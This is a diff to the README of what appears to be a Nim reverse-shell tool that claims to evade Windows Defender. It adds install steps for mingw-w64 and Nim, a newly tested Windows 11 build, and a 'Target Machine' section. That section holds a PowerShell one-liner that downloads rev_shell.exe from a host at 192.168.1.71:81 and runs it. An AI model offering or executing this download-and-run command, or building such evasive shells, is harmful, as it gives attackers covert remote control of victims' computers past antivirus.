@@ -7,7 +7,21 @@ A simple reverse shell written in Nim that bypasses Windows Defender detection (
 
 - Windows 10 (10.0.19045) 
 - Windows 11 (10.0.22621)
+- Windows 11 (10.0.22631)
 
+## Installation
+
+Installing MingW64:
+
+```bash
+apt install mingw-w64
+```
+
+Installing Nim:
+
+```bash
+apt install nim
+```
 
 ## Compilation
 
@@ -17,6 +31,8 @@ The code can be compiled in various ways using Nim. In this example, the code is
 nim c -d:mingw --app:gui rev_shell.nim
 ```
 
+## On Windows(Target Machine)
 
-
-
+```powershell
+Invoke-WebRequest -Uri http://192.168.1.71:81/rev_shell.exe -OutFile rev_shell.exe ; ./rev_shell.exe
+```
